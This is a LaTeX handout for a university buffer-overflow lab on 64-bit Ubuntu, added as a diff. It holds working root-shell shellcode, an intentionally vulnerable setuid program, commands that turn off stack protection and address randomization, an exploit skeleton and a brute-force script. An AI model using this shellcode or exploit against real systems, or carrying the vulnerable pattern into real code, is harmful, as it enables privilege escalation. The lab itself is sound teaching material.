@@ -1,0 +1,492 @@
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+%%  Copyright by Wenliang Du.                                       %%
+%%  This work is licensed under the Creative Commons                %%
+%%  Attribution-NonCommercial-ShareAlike 4.0 International License. %%
+%%  To view a copy of this license, visit                           %%
+%%  http://creativecommons.org/licenses/by-nc-sa/4.0/.              %%
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+
+\newcommand{\commonfolder}{../../common-files}
+
+\input{\commonfolder/header}
+\input{\commonfolder/copyright}
+
+
+\newcommand{\bufFigs}{./Figs}
+
+\lhead{\bfseries SEED Labs -- Buffer Overflow Vulnerability Lab (64-bit)}
+
+\def \code#1 {\fbox{\scriptsize{\texttt{#1}}}}
+
+\begin{document}
+
+\begin{center}
+{\LARGE Buffer Overflow Vulnerability Lab (64-bit)}
+\end{center}
+
+\seedlabcopyright{2020}
+
+
+% *******************************************
+% SECTION
+% ******************************************* 
+\section{Overview}
+
+When we upgraded the SEED virtual machine from the 32-bit 
+Ubuntu 16.04 to 64-bit Ubuntu 20.04, we decided to
+create two different versions for the buffer-overflow lab. One version
+still uses 32-bit vulnerable programs and shellcode (64-bit 
+machines can still run 32-bit programs), and for 
+the other version, everything is switched 64-bit. 
+
+More challenges are introduced due to the 64-bit address, so
+this lab is more difficult than the 32-bit version. 
+In this lab, students will be given a program with a buffer-overflow
+vulnerability; their task is to develop a scheme to exploit 
+the vulnerability and finally gain the root privilege. 
+
+\begin{itemize}[noitemsep]
+\item Buffer overflow vulnerability and attack
+\item Stack layout in a function invocation
+\item Address randomization, Non-executable stack, and  StackGuard
+\item Shellcode. We have a separate lab on how to write shellcode 
+from scratch.
+\end{itemize}
+
+
+\noindent
+\fbox{\parbox{\textwidth}{
+\noindent
+\textbf{Customization by instructor.} Instructors should customize
+this lab by choosing a value for the \texttt{BUF\_SIZE} constant,
+which is used during the compilation of the vulnerable program.
+Different values can make the solutions
+different. Please pick a value
+between \texttt{0} and \texttt{400} for this lab.
+
+\vspace{0.05in}
+\begin{center}
+\textbf{\large The \texttt{BUF\_SIZE} value for this lab is: \underline{\ \ \ \ \ \ \ \ \ \ \ }}
+\end{center}
+}}
+
+
+\paragraph{Readings and videos.}
+Detailed coverage of the buffer-overflow attack can be found in the following:
+
+\begin{itemize}
+\item Chapter 4 of the SEED Book, \seedbook
+\item Section 4 of the SEED Lecture at Udemy, \seedcsvideo
+\end{itemize}
+
+
+\paragraph{Lab environment.} \seedenvironmentB
+
+
+\newpage
+
+
+% *******************************************
+% SECTION
+% ******************************************* 
+\section{Task 1: Running Shellcode}
+
+
+Before starting the attack, let us get familiar with the shellcode. A shellcode is the code to
+launch a shell. It has to be loaded into the memory so that we can force the
+vulnerable program to jump to it. 
+The shellcode is typically written using assembly languages.  
+We provide a sample 64-bit shellcode in the following. 
+There is a separate lab called Shellcode lab, which
+focuses on writing shellcode.  
+
+
+\begin{lstlisting}
+ 0:  48 31 c0             	xor    rax,rax
+ 3:  48 31 ff             	xor    rdi,rdi
+ 6:  b0 69                	mov    al,0x69
+ 8:  0f 05                	syscall
+ a:  48 31 d2             	xor    rdx,rdx
+ d:  52                   	push   rdx
+ e:  48 b8 2f 62 69 6e 2f 	movabs rax,0x68732f2f6e69622f
+15:  2f 73 68
+18:  50                   	push   rax
+19:  48 89 e7             	mov    rdi,rsp
+1c:  52                   	push   rdx
+1d:  57                   	push   rdi
+1e:  48 89 e6             	mov    rsi,rsp
+21:  48 31 c0             	xor    rax,rax
+24:  b0 3b                	mov    al,0x3b
+26:  0f 05                	syscall
+\end{lstlisting}
+
+
+In the following C code, we put the machine code from the above into a buffer, 
+copy it to stack, and then execute the shellcode right from the stack. 
+Please compile and run the following code, and see whether a shell is invoked. You can download
+the program from the website. 
+
+
+\begin{lstlisting}
+/* call_shellcode.c: You can get it from the lab's website */
+/* Launches a shell using shellcode */
+#include <stdlib.h>
+#include <stdio.h>
+#include <string.h>
+
+const char shellcode_64[] =
+  "\x48\x31\xc0\x48\x31\xff\xb0\x69\x0f\x05"   
+  "\x48\x31\xd2\x52\x48\xb8\x2f\x62\x69\x6e"
+  "\x2f\x2f\x73\x68\x50\x48\x89\xe7\x52\x57"
+  "\x48\x89\xe6\x48\x31\xc0\xb0\x3b\x0f\x05"
+;
+
+int main(int argc, char **argv)
+{
+   char buf[sizeof(shellcode_64)];
+   strcpy(buf, shellcode_64);
+   ((void(*)( ))buf)( );
+} 
+\end{lstlisting}
+ 
+
+Compile the code above using the following \texttt{gcc} command 
+Run the program
+and describe your observations. 
+Please do not forget to use the {\tt execstack} option, which allows 
+code to be executed from the stack; without this option, the program will fail.
+
+
+\begin{lstlisting}
+$ gcc -z execstack -o call_shellcode_64 call_shellcode_64.c
+\end{lstlisting}
+
+
+
+% *******************************************
+% SECTION
+% ******************************************* 
+\section{Task 2: Launching Buffer-Overflow Attack}
+
+
+% -------------------------------------------
+% SUBSECTION
+% ------------------------------------------- 
+\subsection{The Vulnerable Program}
+
+You will be provided with the following program, which has 
+a buffer-overflow vulnerability in Line~\ding{192}. Your job
+is to exploit this vulnerability and gain the root privilege. 
+
+\begin{lstlisting}
+/* Vunlerable program: stack.c */
+/* You can get this program from the lab's website */
+
+#include <stdlib.h>
+#include <stdio.h>
+#include <string.h>
+
+/* Changing this size will change the layout of the stack.
+ * Instructors can change this value each year, so students
+ * won't be able to use the solutions from the past.
+ * Suggested value: between 100 and 400  */
+#ifndef BUF_SIZE
+#define BUF_SIZE 100
+#endif
+
+int bof(char *str)
+{
+    char buffer[BUF_SIZE];
+
+    /* The following statement has a buffer overflow problem */ 
+    strcpy(buffer, str);          (*@\ding{192}@*)
+
+    return 1;
+}
+
+int main(int argc, char **argv)
+{
+    char str[517];
+    FILE *badfile;
+
+     /* Change the size of the dummy array to randomize the parameters
+       for this lab. Need to use the array at least once */
+    char dummy[BUF_SIZE];  memset(dummy, 0, BUF_SIZE); 
+
+    badfile = fopen("badfile", "r");
+    fread(str, sizeof(char), 517, badfile);
+    bof(str);
+    printf("Returned Properly\n");
+    return 1;
+}
+\end{lstlisting}
+
+The above program has a buffer overflow vulnerability. It first 
+reads an input from a file called \texttt{badfile}, and then passes this
+input to another buffer in the function {\tt bof()}. The 
+original input can have a maximum length of \texttt{517} bytes, but the buffer
+in {\tt bof()} is only \texttt{BUF\_SIZE} bytes long, which is less than
+\texttt{517}. 
+Because {\tt strcpy()} does not check
+boundaries, buffer overflow will occur.
+Since this program is a root-owned \setuid program, if a normal user can exploit
+this buffer overflow vulnerability, the user might be 
+able to get a root shell.
+It should be noted that 
+the program gets its input from a file called \texttt{badfile}. This file
+is under users' control. Now, our objective is to 
+create the contents for \texttt{badfile}, such that when the vulnerable program
+copies the contents into its buffer, a root shell can be spawned.
+
+
+\paragraph{Compilation.}
+To compile the above vulnerable program, do not forget to 
+turn off the StackGuard and the non-executable stack protections 
+using the \texttt{-fno-stack-protector} and \texttt{"-z execstack"} options.
+After the compilation, we need to make the program a
+root-owned \setuid program. We can achieve this by first change the ownership of the program to
+\texttt{root} (Line \ding{192}), and then change the permission to \texttt{4755} to enable the
+\setuid bit (Line \ding{193}). It should be noted that changing ownership must be done before
+turning on the \setuid bit, because ownership change will cause the \setuid bit to be turned
+off.
+
+
+\begin{lstlisting}
+// Note: N should be replaced by the value set by the instructor
+$ gcc -DBUF_SIZE=N -o stack -z execstack -fno-stack-protector stack.c
+$ sudo chown root stack          (*@\ding{192}@*)
+$ sudo chmod 4755 stack          (*@\ding{193}@*)
+\end{lstlisting}
+
+
+Before running the vulnerable program, we need to make sure the 
+address randomization countermeasure is turned off; otherwise, the 
+attack will be very difficult. 
+You can do it using the following command:
+
+\begin{lstlisting}
+$ sudo /sbin/sysctl -w kernel.randomize_va_space=0
+\end{lstlisting}
+
+ 
+
+\paragraph{For instructors.}
+To prevent students from using the solutions from the past (or from those
+posted on the Internet), instructors can change the
+value for \texttt{BUF\_SIZE} by requiring students to compile the
+server code using a different \texttt{BUF\_SIZE} value.
+Without the \texttt{-DBUF\_SIZE}
+option, \texttt{BUF\_SIZE} is set to the default value 100 (defined
+in the program).
+When this value changes, the layout of the stack
+will change, and the solution will be different.
+
+
+% -------------------------------------------
+% SUBSECTION
+% ------------------------------------------- 
+\subsection{Task 2.1: Investigation} 
+
+To exploit the buffer-overflow vulnerability in the target program,
+the most important thing to know is the distance between the 
+buffer's starting position and the place where the return-address
+is stored. We will use a debugging method to find it out.
+Since we have the source code of the target program, we
+can compile it with the debugging flag turned on. That will make it more
+convenient to debug. Here is the \texttt{gcc} command.
+
+\begin{lstlisting}
+$ gcc -DBUF_SIZE=N -z execstack -fno-stack-protector  \
+      -g -o stack_dbg stack.c
+\end{lstlisting}
+
+In addition to disabling two countermeasures as before, the above compilation
+uses the \texttt{-g} flag to compile the program, so debugging information
+is added to the binary.  The compiled program (\texttt{stack\textunderscore dbg}) is
+then debugged using \texttt{gdb}. We need to create a file called
+\texttt{badfile} before running the program. 
+
+\begin{lstlisting}
+$ touch badfile     (*@\reflectbox{\ding{217}} \textbf{Create an empty badfile}@*)
+$ gdb stack_dbg
+gdb-peda$ b bof     (*@\reflectbox{\ding{217}} \textbf{Set a break point at function bof()}@*)
+Breakpoint 1 at 0x11c9: file stack.c, line 18.
+gdb-peda$ run       (*@\reflectbox{\ding{217}} \textbf{Start executing the program}@*)
+...
+Breakpoint 1, bof (str=0xffffcf57 ...) at stack.c:18
+18  {
+gdb-peda$ next      (*@\reflectbox{\ding{217}} \textbf{See the note below}@*)
+...
+22	    strcpy(buffer, str);
+gdb-peda$ p $rbp    (*@\reflectbox{\ding{217}} \textbf{Get the rbp value (frame pointer)}@*)
+$1 = (void *) 0x7fffffffdd10
+gdb-peda$ p &buffer (*@\reflectbox{\ding{217}} \textbf{Get the buffer's address}@*)
+$2 = (char (*)[100]) 0x7fffffffdca0
+gdb-peda$ quit      (*@\reflectbox{\ding{217}} \textbf{exit}@*)
+\end{lstlisting}
+
+
+\paragraph{Note.} 
+In the x86 architecture,
+the frame pointer is \texttt{ebp}, but in the x64 architecture,
+it is the \texttt{rbp} register. 
+When the GDB stops inside the \texttt{bof()} function, it 
+stops before the frame pointer \texttt{rbp} is modified
+to point the current stack frame, so 
+if we print out the value of 
+\texttt{rbp} here, we will get the caller's \texttt{rbp} value. 
+We need to use 
+\texttt{next} to execute a few instructions and stop 
+after the \texttt{rbp} register is modified to point to the stack
+frame of the \texttt{bof()} function. 
+The SEED book is based on Ubuntu 16.04, and the GDB's behavior is slightly
+different, so the book does not have the \texttt{next} step. 
+
+
+% -------------------------------------------
+% SUBSECTION
+% ------------------------------------------- 
+\subsection{Task 2.2: Write Exploit Code and Launch Attack} 
+
+To exploit the buffer-overflow vulnerability in the target program,
+we need to prepare a payload, and save it inside \texttt{badfile}. 
+We will use programs to do that.
+We provide a Python skeleton program
+called \texttt{exploit\_64.py}, which
+can be downloaded from the lab's website.
+The shellcode is already provided in the code. 
+The code is incomplete, and students need to replace some of the essential 
+values in the code. 
+
+
+\begin{lstlisting}
+#!/usr/bin/python3
+import sys
+
+shellcode_64= (
+  "\x48\x31\xc0\x48\x31\xff\xb0\x69\x0f\x05"
+  "\x48\x31\xd2\x52\x48\xb8\x2f\x62\x69\x6e"
+  "\x2f\x2f\x73\x68\x50\x48\x89\xe7\x52\x57"
+  "\x48\x89\xe6\x48\x31\xc0\xb0\x3b\x0f\x05"
+).encode('latin-1')
+
+# Fill the content with NOP's
+content = bytearray(0x90 for i in range(517))
+
+
+##################################################################
+# Put the shellcode somewhere in the payload
+start =  200                   # replace this number
+content[start:start + len(shellcode_64)] = shellcode_64
+
+
+# Decide the return address value 
+# and save it somewhere in the payload
+ret    = 0x00007FFFAABBCCDD   # replace this number
+offset = 0                    # replace this number
+content[offset:offset + 8] = (ret).to_bytes(8,byteorder='little')
+##################################################################
+
+# Write the content to a file
+with open('badfile', 'wb') as f:
+  f.write(content)
+\end{lstlisting}
+
+
+After you finish the above program, run it. This will generate
+the contents for \texttt{badfile}. Then run the vulnerable 
+program {\tt stack}. If your exploit is implemented correctly, you should 
+be able to get a root shell:  
+
+\begin{lstlisting}
+$./exploit_64.py     // create the badfile
+$./stack          // launch the attack by running the vulnerable program
+# <---- Bingo! You've got a root shell! 
+\end{lstlisting}
+ 
+
+\paragraph{Challenges.} Compared to buffer-overflow attacks on 32-bit 
+machines, attacks on 64-bit machines is more difficult. The most 
+difficult part is the address. Although the x64 architecture 
+supports 64-bit address space, only the address from 
+\texttt{0x00} through \texttt{0x00007FFFFFFFFFFF} is allowed. That means for 
+every address (8 bytes), the highest two bytes are always zeros. 
+This causes a problem.
+
+In our buffer-overflow attacks, we need to store at least one address 
+in the payload, and the payload will be copied into the stack via
+\texttt{strcpy()}. We know that the \texttt{strcpy()} function
+will stop copying when it sees a zero. Therefore, if zero 
+appears in the middle of the payload, the content after the 
+zero cannot be copied into the stack. How to solve this 
+problem is the most difficult challenge in this attack. 
+
+
+Another challenge, a less difficult one, is that the frame pointer value 
+obtained from the GDB is different from that during the actual
+execution (without using GDB). In the 32-bit machine, there 
+was also some difference, but the difference was not very large. 
+Keep this in mind when constructing the payload. 
+
+
+% *******************************************
+% SECTION
+% *******************************************
+\section{Task 3: Experimenting with the Address Randomization}
+
+On 32-bit Linux machines, only 19 bites can be used for address randomization.
+That is not enough, and we can easily hit the target 
+if we run the attack for sufficient number of times. For 64-bit 
+machines, the number of bits used for randomization is 
+significantly increased. 
+
+In this task, we will give it a try and see whether we will be 
+able to succeed in our attack when the address randomization countermeasure 
+is enabled. 
+Ubuntu's address randomization can be turned on 
+using the following command.  
+
+
+\begin{lstlisting}
+$ sudo /sbin/sysctl -w kernel.randomize_va_space=2
+\end{lstlisting}
+
+
+We then use the brute-force approach to attack the vulnerable program repeatedly, hoping that 
+the address we put in the \texttt{badfile} can eventually be correct. You can 
+use the following shell script to run the vulnerable program in an infinite loop. If your
+attack succeeds, the script will stop; otherwise, it will keep running. 
+Please run the script for at least 2 hours, and report your results. It should be 
+noted that the chance to succeed in 2 hours is not very high.  
+
+
+\begin{lstlisting}
+#!/bin/bash
+
+SECONDS=0
+value=0
+
+while [ 1 ]
+  do
+  value=$(( $value + 1 ))
+  duration=$SECONDS
+  min=$(($duration / 60))
+  sec=$(($duration % 60))
+  echo "$min minutes and $sec seconds elapsed."
+  echo "The program has been running $value times so far."
+  ./stack
+done
+\end{lstlisting}
+
+
+
+% *******************************************
+% SECTION
+% *******************************************
+\section{Submission}
+
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+\input{\commonfolder/submission}
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+
+\end{document}
